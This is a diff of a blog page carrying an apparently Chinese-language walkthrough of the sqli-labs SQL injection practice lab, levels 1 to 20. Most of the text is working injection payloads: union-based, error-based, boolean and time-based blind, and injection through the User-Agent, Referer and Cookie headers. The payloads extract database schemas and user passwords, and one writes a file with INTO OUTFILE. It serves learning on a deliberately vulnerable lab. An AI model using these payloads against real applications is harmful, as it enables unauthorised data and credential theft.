@@ -16,14 +16,14 @@ document.addEventListener("pjax:success", initScrollReveal);
 <meta property="og:description" content="sqli-labs Less-1网址：http:&#x2F;&#x2F;45.32.113.109:26711&#x2F;Less-1&#x2F;?id&#x3D;1 显示结果：  Your Login:Dumb  Your Password:Dumb  . ?id&#x3D;1&#39; order by 3 --+   #字段数为3 ?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,3 --+  #显示位为2，3  *">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-03-23T06:47:42.000Z">
-<meta property="article:modified_time" content="2022-03-31T10:51:11.539Z">
+<meta property="article:modified_time" content="2022-04-07T07:41:36.947Z">
 <meta property="article:author" content="byj">
 <meta name="twitter:card" content="summary"><script>(function() {
   const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
   const setting = localStorage.getItem('darken-mode') || 'auto'
   if (setting === 'dark' || (prefersDark && setting !== 'light'))
     document.documentElement.classList.toggle('dark', true)
-})()</script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="byj"><img width="96" loading="lazy" src="/yun.png" alt="byj"></a><div class="site-author-name"><a href="/about/">byj</a></div><span class="site-name">aurora</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-1"><span class="toc-number">1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-2"><span class="toc-number">2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-3"><span class="toc-number">3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-4"><span class="toc-number">4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-5-6"><span class="toc-number">5.</span> <span class="toc-text">Less-5,6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-7"><span class="toc-number">6.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-8"><span class="toc-number">7.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-9-10"><span class="toc-number">8.</span> <span class="toc-text">Less-9,10</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://example.com/2022/03/23/sqli-labs/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="byj"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="aurora"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">sqli-labs靶场</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-03-23 14:47:42" itemprop="dateCreated datePublished" datetime="2022-03-23T14:47:42+08:00">2022-03-23</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2022-03-31 18:51:11" itemprop="dateModified" datetime="2022-03-31T18:51:11+08:00">2022-03-31</time></div><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><html>
+})()</script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="byj"><img width="96" loading="lazy" src="/yun.png" alt="byj"></a><div class="site-author-name"><a href="/about/">byj</a></div><span class="site-name">aurora</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-1"><span class="toc-number">1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-2"><span class="toc-number">2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-3"><span class="toc-number">3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-4"><span class="toc-number">4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-5-6"><span class="toc-number">5.</span> <span class="toc-text">Less-5,6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-7"><span class="toc-number">6.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-8"><span class="toc-number">7.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-9-10"><span class="toc-number">8.</span> <span class="toc-text">Less-9,10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-11%E3%80%8112"><span class="toc-number">9.</span> <span class="toc-text">Less-11、12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-13%E3%80%8114"><span class="toc-number">10.</span> <span class="toc-text">Less-13、14</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-15-%E3%80%8116"><span class="toc-number">11.</span> <span class="toc-text">Less-15 、16#</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-17"><span class="toc-number">12.</span> <span class="toc-text">Less-17</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-18"><span class="toc-number">13.</span> <span class="toc-text">Less-18</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-19"><span class="toc-number">14.</span> <span class="toc-text">Less-19</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-20"><span class="toc-number">15.</span> <span class="toc-text">Less-20</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://example.com/2022/03/23/sqli-labs/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="byj"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="aurora"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">sqli-labs靶场</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-03-23 14:47:42" itemprop="dateCreated datePublished" datetime="2022-03-23T14:47:42+08:00">2022-03-23</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2022-04-07 15:41:36" itemprop="dateModified" datetime="2022-04-07T15:41:36+08:00">2022-04-07</time></div><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><html>
 <head>
 <meta charset="UTF-8">
 </head>
@@ -146,6 +146,7 @@ http://45.32.113.109:26711/Less-3/?id=-1&#39;) union select 1,2,group_concat(id,
 <p>找到密码</p>
 <pre><code>?id=1’ and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1) –+
 </code></pre>
+<p>6、单引号改为双引号</p>
 <h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>load_file（）：读取文件</p>
 <pre><code>union select 1,2,&#39;123&#39;into outfile &quot;\var\lib\mysql\1.txt&quot;%23
 </code></pre>
@@ -156,8 +157,82 @@ http://45.32.113.109:26711/Less-3/?id=-1&#39;) union select 1,2,group_concat(id,
 判断表名长度：?id=1&#39; and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 -- 
 </code></pre>
 <h1 id="Less-9-10"><a href="#Less-9-10" class="headerlink" title="Less-9,10"></a>Less-9,10</h1><p>基于时间的盲注</p>
-<pre><code>?id=1&#39;and if(length(database())=8 , sleep(3), 1) –+  #通过延迟来判断
+<pre><code>?id=1&#39; and if(length(database())=8 , sleep(3), 1) –+  #通过延迟来判断
 ?id=1&#39; and if(ascii(substr(database(),1,1))&gt;96,sleep(5),0)--+  #判断数据库名前两个个字符（if里第一个1改为2查询第二个字符）
+id=1’ and if(length(database())&gt;7, 0, sleep(5))–+  #判断数据库名长度
+id=1’ and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))–+
+</code></pre>
+<h1 id="Less-11、12"><a href="#Less-11、12" class="headerlink" title="Less-11、12"></a>Less-11、12</h1><p>POST字符型注入</p>
+<p>11:单引号</p>
+<pre><code>’ union select 1,database()– -
+
+’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’ --+  #查找users表
+
+’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’--+  #查列名
+
+’ union select 1,group_concat(username,’-‘,password) from security.users --+  #查找密码
+</code></pre>
+<p>12：POST型双引号字符型注入</p>
+<h1 id="Less-13、14"><a href="#Less-13、14" class="headerlink" title="Less-13、14"></a>Less-13、14</h1><p>b报错注入</p>
+<pre><code>uname=admin’) union select updatexml(1,concat(0x7e,(database()),0x7e),1) --+  #查数据库名
+
+admin’) union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),0x7e),1) --+   #找到users表
+
+admin’) union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’),0x7e),1) --+  #查找列名
+
+admin’) union select updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1) --+  #查数据
+</code></pre>
+<h1 id="Less-15-、16"><a href="#Less-15-、16" class="headerlink" title="Less-15 、16#"></a>Less-15 、16#</h1><p>基于bool型/时间延迟单引号POST型盲注<br>没有回显可以通过pretty内容判断：flag为正确，slag为错误</p>
+<p>猜解数据库长</p>
+<pre><code>uname=123&#39;or 1=1 and (length(database()))=8 --+  #数据库长度为8
+</code></pre>
+<p>确定一下开头的首字母 </p>
+<pre><code>‘ or ascii(substr(database(),1,1)) =115 --+  #首字母是s  &quot;security&quot;
+</code></pre>
+<p>布尔盲注</p>
+<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>用户名:admin </p>
+<p>密码：admin’ and extractvalue(1,concat(0x7e,(select version()))) –+</p>
+<h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>http头——user-agent注入</p>
+<p>几个请求头的意义：</p>
+<pre><code>user-agent:浏览器身份识别的字符串
+
+referer:表示浏览器前一个访问页面，可以是认为之前访问页面的链接将浏览器带到了当前页面
+
+accept:可接受的响应内容类型
+
+x-forwarded-for:可以用来表示HTTP请求段真实的IP
+
+date:发送信息的日期和时间
+</code></pre>
+<p>用Burp抓取输入正确用户密码的登录页面,然后在报头文User-Agent:后加入注入语句</p>
+<pre><code>‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#
+
+**
+
+‘,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),0x7e),1))#
+
+‘,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’),0x7e),1))#
+
+‘,1,updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1))#
+</code></pre>
+<h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>报头注入<br>用Burp抓取输入正确用户密码的登录页面,然后在报头文Referer:后加入注入语句</p>
+<pre><code>‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#
+
+‘,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),0x7e),1))#
+
+‘,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’),0x7e),1))#
+
+‘,1,updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1))#
+</code></pre>
+<h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>基于’的Cookie:报头文报错注入</p>
+<p>用Burp抓取输入正确用户密码的登录页面,然后在报头文Cookie:后加入注入语句</p>
+<pre><code>uname=admin’ union select 1,2,database() --+  #查数据库
+
+uname=admin’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ --+  #查表名
+
+uname=admin’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’ --+  #查数据
+
+uname=admin’ union select 1,2,group_concat(username,’-‘,password) from security.users–+
 </code></pre>
 </body>
 </html>
